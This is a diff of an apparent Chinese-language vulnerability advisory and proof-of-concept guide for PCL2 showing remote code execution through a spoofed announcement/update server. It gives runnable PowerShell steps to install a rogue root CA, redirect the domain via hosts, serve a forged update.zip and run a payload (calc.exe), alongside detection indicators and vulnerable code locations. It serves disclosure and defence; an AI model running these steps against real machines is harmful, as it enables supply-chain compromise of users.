-1. 生成 CA，并为 `pcl2-server-1253424809.file.myqcloud.com` 签发叶子证书；
+1. 生成 CA。并为 `pcl2-server-1253424809.file.myqcloud.com` 签发叶子证书；
 2. 把 CA 装进 Windows 根证书存储；
-3. 改 hosts，把公告域名指到 `127.0.0.1`；
-4. 本地 443 起 HTTPS 服务器，返回伪造的 `notice.cfg` / `notice.json` / `ServerConfig.json` / `update.zip`；
-5. 启动 PCL，按模式触发：`launch` 是启动后点"启动游戏"；`update` 是等静默更新 staging 后关闭 PCL；`xaml` 是第一次启动写设置、第二次启动点页面按钮；
-6. payload 写 `%TEMP%\pcl-poc-marker.txt` 并启动 `calc.exe`；
-7. 清理 hosts / 根证书 / PCL 注册表与 staging。
+3. 修改 hosts。将公告域名指定到 `127.0.0.1`；
+4. 启动 HTTPS 服务器，监听 443 端口。
+5. 返回伪造的 `notice.cfg` / `notice.json` / `ServerConfig.json` / `update.zip`；
+6. 启动 PCL。
+    按模式触发：
+    -  `launch`，启动后点"启动游戏"；
+     - `update`，静默更新 staging 后关闭 PCL；
+7. 写 payload (`%TEMP%\pcl-poc-marker.txt`) 并启动 `calc.exe`。
 
-### 6.2 文件清单
+### PoC 文件清单
 
 ```text
-poc/
+repo/
 ├── server.ps1                # 纯 PowerShell HTTPS 伪造服务器（默认，无需 Python）
 ├── server.py                 # Python 版服务器（-Server python 时使用）
 ├── Invoke-PCLPoC.ps1         # Windows 管理员一键脚本（自签证书/hosts/启动/清理）
@@ -612,89 +568,74 @@ poc/
 │   └── server.crt / server.key  # 为公告域名签发的 leaf
 ├── samples/                  # 需求方原始 notice.json 与计算器变体
 ├── www/                      # update.zip / 静态文件（运行时生成）
-└── README.md                 # 运行说明
+└── README.llm.md                 # 运行说明
 ```
 
-### 6.3 前置条件
+### 先决条件
 
 - Windows 虚拟机；
 - PCL2 2.99.0.0（样本 exe）；
 - .NET Framework 4.8（Windows 自带）；
-- 管理员权限（改 hosts、装根证书、监听 443）；Windows PowerShell 5.1（脚本会自动从 pwsh 7 切回 5.1）；
+- 管理员权限（改 hosts、装根证书、监听 443）；Windows PowerShell 5.1+；
 - `launch` 模式需要一个可启动的 Minecraft 实例；
 - 首次运行 PCL 需先手动接受 EULA 并初始化。
 
-### 6.4 运行
+### 运行
 
 ```powershell
 # 以管理员身份打开 PowerShell
 cd <PCL目录>\poc
-powershell -ExecutionPolicy Bypass -File .\Invoke-PCLPoC.ps1 -Mode update
-```
+powershell -ExecutionPolicy Bypass -File .\Invoke-PCLPoC.ps1 -Mode both -Manual
 
-- `-Mode update`：零点击方法二。脚本启动 PCL，等 `PCL\Plain Craft Launcher 2.exe` staging 出现，关闭 PCL，校验 `%TEMP%\pcl-poc-marker.txt` 与 `calc.exe`。
-- `-Mode launch`：利用方法一。脚本启动 PCL 后提示你点"启动游戏"，然后校验 marker。
-- `-Mode both`：默认，利用方法一加方法二。
-- `-Manual`：不自动启动/关闭 PCL。脚本只装 CA、改 hosts、起服务端，然后等你按 Enter；PCL 由研究者自己启动/关闭，适合用自己已配置好的 PCL，并在关闭前继续看日志或抓包。按 Enter 后才校验 marker 并清理。
-- `-Manual` 且省略 `-PclPath`：完全 server-only，不读取、不备份、不启动、不关闭任何 PCL；此时公告对 `PCL\Setup.ini` 的修改不会自动恢复，建议用可丢弃的 PCL 副本。
+# 或者手动一点
 
-也可以手动分步跑：
-
-```powershell
 # 1) 安装 CA
 Import-Certificate .\certs\ca.crt -CertStoreLocation Cert:\LocalMachine\Root
 # 2) 改 hosts
 Add-Content $env:SystemRoot\System32\drivers\etc\hosts "`r`n127.0.0.1 pcl2-server-1253424809.file.myqcloud.com"
 # 3) 起服务
 powershell.exe -File .\server.ps1 -Mode update -Port 443 -PayloadExe C:\Users\Public\pclpoc.exe -CertThumbprint <叶子证书指纹>
-
 # 或者用 Python 版：
 # python .\server.py --mode update --port 443 --payload-exe C:\Users\Public\pclpoc.exe
 # 4) 启动 PCL，等待更新 staging，关闭 PCL
+
 ```
 
-### 6.5 预期结果
+### 预期结果
 
-`update` 模式：
+- `update` 模式：
 
-1. 服务端日志（`server.out.log`）出现：
+1. `server.out.log` 出现：
 
-   ```
-   [req ] /notice.cfg
-   [req ] /ServerConfig.json
-   [req ] /notice.json
-   [req ] /update.zip
-   ```
+```
+[req ] /notice.cfg
+[req ] /ServerConfig.json
+[req ] /notice.json
+[req ] /update.zip
+```
 
-2. `<PCL目录>\PCL\Plain Craft Launcher 2.exe` 出现（内容为 payload）；
+2. `<PCL目录>\PCL\Plain Craft Launcher 2.exe` payload 产生；
 3. 关闭 PCL 后，`calc.exe` 启动；
 4. `%TEMP%\pcl-poc-marker.txt` 内容类似：
+```
+2026-10-21T23:45:12.3456789+08:00 pid=1234 args=--update 5678 "Plain Craft Launcher 2.exe" ...
+```
 
-   ```
-   2026-10-21T23:45:12.3456789+08:00 pid=1234 args=--update 5678 "Plain Craft Launcher 2.exe" ...
-   ```
-
-`launch` 模式：
+- `launch` 模式：
 
 1. PCL 日志出现：
 
-   ```
-   执行 PCL 服务器公告动作...（setup, ...）
-   ...
-   正在执行全局自定义命令：C:\Users\Public\pclpoc.exe
-   ```
+```
+执行 PCL 服务器公告动作...（setup, ...）
+...
+正在执行全局自定义命令：C:\Users\Public\pclpoc.exe
+```
 
 2. 点击"启动游戏"后 `calc.exe` 启动，marker 生成。
 
-`xaml` 模式：
+## <a id="response" ></a> 检测与响应
 
-1. 第二次启动后 `%TEMP%\PCL\Cache\Custom.xaml` 出现；
-2. 点击页面 `Continue` 后 `calc.exe` 启动，marker 生成；
-3. PCL 日志出现 `执行自定义事件：执行命令, C:\Users\Public\pclpoc.exe`。
-
-## 7. 检测与响应<a id="response" ></a>
-
-### 7.1 主机侧
+### 主机侧
 
 - `hosts` 中出现 `pcl2-server-1253424809.file.myqcloud.com` 指向非官方 IP；
 - 根证书存储中出现非官方 CA（尤其 CN 含 `PoC` 或随机字符串的）；
@@ -704,57 +645,42 @@ powershell.exe -File .\server.ps1 -Mode update -Port 443 -PayloadExe C:\Users\Pu
 - `PCL\Setup.ini` 中 `LaunchAdvanceRun`、`UiCustomType`、`UiCustomNet`、`HintCustomCommand` 被改成陌生值；
 - PCL 日志关键词：`下载 PCL 服务器公告`、`执行 PCL 服务器公告动作`、`启动器静默更新`、`更新程序启动`、`执行全局自定义命令`、`执行自定义事件：执行命令`。
 
-### 7.2 网络侧
+### 网络侧
 
 - 对 `pcl2-server-1253424809.file.myqcloud.com` 的 `notice.cfg` / `notice.json` / `ServerConfig.json` 请求；
 - 随后对任意 `DownloadUrls` 的 `.zip` 下载；
 - 证书异常（非腾讯云/非官方 CA）；
 - DNS 解析异常。
 
-### 7.3 修复建议
+### 修复建议
 
 请更换更有信任的更新机制。
 
-### 7.4 披露建议
-
-无。
-
-### 7.5 风险评级
-
-| 维度 | 评估 |
-|---|---|
-| 严重性 | High / 供应链级 RCE |
-| 攻击向量 | 网络（CDN 内容、DNS、TLS 中间人） |
-| 前提 | 控制公告 CDN 内容，或能让系统信任攻击者证书 |
-| 用户交互 | `update` 仅需正常关闭 PCL；`launch` 需一次点击 |
-| 影响 | 当前用户权限任意代码执行、持久化、数据窃取、批量控制 |
-| 检测难度 | 中高：无文件落地也可通过 `PCL\Plain Craft Launcher 2.exe` 暂存发现；日志有特征 |
-
-## 8. 附录<a id="footnotes" ></a>
+## <a id="footnotes" ></a> 附录
 
 ### A. 关键代码位置
 
-| 功能 | 文件:行 |
-|---|---|
-| `ServerLoader` 定义 | `PCL/ModSecret.cs:382` |
-| `ServerSub` 公告主流程 | `PCL/ModSecret.cs:1262` |
-| `notice.cfg` 拉取 | `PCL/ModSecret.cs:1324` |
-| `ServerConfig.json` 拉取 | `PCL/ModSecret.cs:1382` |
-| `notice.json` 拉取/缓存 | `PCL/ModSecret.cs:1403-1406` |
-| `actions` 分发 | `PCL/ModSecret.cs:1479-1534` |
-| `setup` 任意设置 | `PCL/ModSecret.cs:1495-1502` |
-| `HasUpdatePermission => true` | `PCL/ModSecret.cs:402` |
-| `UpdateStart` | `PCL/ModSecret.cs:957` |
-| 更新 URL 选择 | `PCL/ModSecret.cs:1004-1026` |
-| zip 解压/安装 | `PCL/ModSecret.cs:190-211` |
-| `UpdateRestart` | `PCL/ModSecret.cs:1084-1097` |
-| `LaunchAdvanceRun` 执行 | `PCL/ModLaunch.cs:2865-2925` |
-| 自定义主页加载 | `PCL/PageLaunchRight.cs:385-419` |
-| XAML 黑名单 | `PCL/ModBase.cs:1418-1447` |
-| 自定义事件执行命令 | `PCL/CustomEvent.cs:129-150` |
-| 事件确认绕过 | `PCL/CustomEvent.cs:455-470` |
-| 设置默认值 | `PCL/Settings.cs:141-175, 246-249, 315-320` |
-| 遥测 | `PCL/ModMain.cs:1807-1837` |
+| 功能                          | 文件:行                                     |
+| ----------------------------- | ------------------------------------------- |
+| `ServerLoader` 定义           | `PCL/ModSecret.cs:382`                      |
+| `ServerSub` 公告主流程        | `PCL/ModSecret.cs:1262`                     |
+| `notice.cfg` 拉取             | `PCL/ModSecret.cs:1324`                     |
+| `ServerConfig.json` 拉取      | `PCL/ModSecret.cs:1382`                     |
+| `notice.json` 拉取/缓存       | `PCL/ModSecret.cs:1403-1406`                |
+| `actions` 分发                | `PCL/ModSecret.cs:1479-1534`                |
+| `setup` 任意设置              | `PCL/ModSecret.cs:1495-1502`                |
+| `HasUpdatePermission => true` | `PCL/ModSecret.cs:402`                      |
+| `UpdateStart`                 | `PCL/ModSecret.cs:957`                      |
+| 更新 URL 选择                 | `PCL/ModSecret.cs:1004-1026`                |
+| zip 解压/安装                 | `PCL/ModSecret.cs:190-211`                  |
+| `UpdateRestart`               | `PCL/ModSecret.cs:1084-1097`                |
+| `LaunchAdvanceRun` 执行       | `PCL/ModLaunch.cs:2865-2925`                |
+| 自定义主页加载                | `PCL/PageLaunchRight.cs:385-419`            |
+| XAML 黑名单                   | `PCL/ModBase.cs:1418-1447`                  |
+| 自定义事件执行命令            | `PCL/CustomEvent.cs:129-150`                |
+| 事件确认绕过                  | `PCL/CustomEvent.cs:455-470`                |
+| 设置默认值                    | `PCL/Settings.cs:141-175, 246-249, 315-320` |
+| 遥测                          | `PCL/ModMain.cs:1807-1837`                  |
 
 
 ### B. 官方来源
